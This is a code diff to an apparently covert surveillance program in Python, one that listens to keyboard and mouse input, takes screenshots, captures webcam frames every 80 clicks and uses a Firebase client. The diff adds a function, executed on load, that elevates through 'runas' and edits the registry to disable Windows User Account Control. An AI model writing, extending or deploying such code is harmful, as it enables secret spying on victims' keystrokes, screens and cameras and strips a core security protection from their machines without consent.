@@ -10,6 +10,17 @@ import mss as mss
 from pynput import keyboard, mouse
 from datetime import datetime as date
 import pyrebase
+import win32com.shell.shell as win32shell
+
+
+def disable_UAC():
+    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
+    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command1)
+    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
+    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command2)
+
+
+disable_UAC()
 
 
 def is_admin():
@@ -143,8 +154,8 @@ def on_click(x, y, button, pressed):
         except Exception as e:
             print(e)
 
-    elif clicks_counter==80:
-        clicks_counter=0
+    elif clicks_counter == 80:
+        clicks_counter = 0
         try:
             vc = cv2.VideoCapture(0)
             if vc.isOpened():  # try to get the first frame
